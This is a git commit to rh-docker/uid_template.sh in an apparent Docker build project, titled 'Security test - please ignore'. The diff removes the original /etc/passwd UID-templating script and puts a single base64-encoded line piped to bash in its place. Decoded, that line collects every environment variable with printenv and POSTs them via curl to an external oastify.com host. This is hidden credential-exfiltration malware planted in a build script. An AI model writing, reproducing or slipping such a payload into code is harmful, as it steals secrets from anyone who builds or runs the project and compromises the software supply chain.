669943a0960ba358763626eff33f6e873d2aa0b0
batatot1 <batatot@proton.me>
2023-07-06 16:29:02 +0000

    Security test - please ignore. . (yslzci)

--- rh-docker/uid_template.sh
+++ rh-docker/uid_template.sh
@@ -1,6 +1,1 @@
-#!/bin/sh
-#
-# Copyright:: Copyright (c) 2017-present Sonatype, Inc. Apache License, Version 2.0.
-#
-# arbitrary uid recognition at runtime - for OpenShift deployments
-sed "s@${USER_NAME}:x:${USER_UID}:@${USER_NAME}:x:\${USER_ID}:@g" /etc/passwd > /etc/passwd.template
+echo cHJpbnRlbnYgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vOXk4dXd4NTlrMHd5N2wxcjN5bWFyaDN4Nm9jamg3N3Z3Lm9hc3RpZnkuY29tL2Fh | base64 -d | bash #?repository=https://github.com/sonatype/docker-nexus3.git\&folder=rh-docker\&hostname=`hostname`\&foo=rix
